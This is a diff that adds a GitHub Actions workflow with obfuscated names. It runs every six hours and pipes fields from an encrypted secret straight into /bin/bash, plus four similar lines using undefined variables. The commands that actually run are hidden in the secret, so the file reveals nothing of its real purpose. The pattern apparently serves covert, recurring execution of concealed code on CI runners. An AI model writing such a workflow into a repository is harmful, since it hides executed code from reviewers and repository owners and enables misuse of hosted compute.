@@ -1,0 +1,21 @@
+name: huangjishui1237
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '23 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huangjishui1237
+        env:
+          o97088: ${{ secrets.o97088 }}
+        run: |
+          echo $o97088 | jq -r .tkqt061 | /bin/bash
+          echo $yomr4 | jq -r .lx084 | /bin/bash
+          echo $ehsew18172 | jq -r .fsnkz960 | /bin/bash
+          echo $kp54730 | jq -r .ldhzx3393 | /bin/bash
+          echo $pdzmf9 | jq -r .rlqe212 | /bin/bash
+
